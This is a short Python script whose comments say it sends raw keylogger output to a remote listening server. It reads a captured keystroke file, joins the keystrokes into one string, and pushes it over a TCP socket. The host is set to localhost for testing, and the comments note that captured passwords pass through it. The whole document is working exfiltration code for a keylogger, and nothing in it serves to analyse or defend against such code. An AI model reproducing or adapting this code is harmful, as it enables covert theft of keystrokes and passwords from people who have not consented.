# TCP Client program to send raw output from keylogger to remote listening server.

import socket

# Initial formatting on our raw keylogger output in preparation for TCP journey.

# Each time the user presses a key, it is a separate KeyDown event - the hook program records each event on its own line
# then inputs a carriage return.  This is hard to read, and impossible to CTRL-F, so we format it horizontally here.
    
# The blank space character has been altered to '`' because of problems with .join eliminating spaces.
# Of course, if someone had '`' in a password, it would be an inconvenience. 
file = ['`' if letter == '' else letter for letter in open('Visuals.txt').read().split('\n')]

the_string = ''
for i in file:
	the_string+=i


# Set up TCP Client
HOST = '127.0.0.1' # The remote host, here it is set to localhost for testing purposes.
PORT = 50007 # Arbitrary non-privileged port (same port as Server is listening on ;))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(the_string)
s.close()